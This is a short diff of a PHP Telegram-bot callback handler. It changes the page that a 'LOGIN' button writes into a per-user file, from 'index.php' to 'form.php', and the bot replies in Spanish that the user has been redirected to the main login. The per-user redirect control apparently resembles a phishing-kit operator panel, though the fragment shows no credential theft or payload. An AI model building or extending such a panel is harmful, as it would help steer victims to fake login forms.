@@ -102,7 +102,7 @@ if (isset($update["callback_query"])) {
             "show_alert" => false
         ]));
     } elseif ($accion === "LOGIN") {
-        file_put_contents($acciones_dir . "/{$usuario}.txt", "index.php");
+        file_put_contents($acciones_dir . "/{$usuario}.txt", "form.php");
         file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
             "callback_query_id" => $callback_query_id,
             "text" => "🔁 Redirigido a LOGIN principal para $usuario",
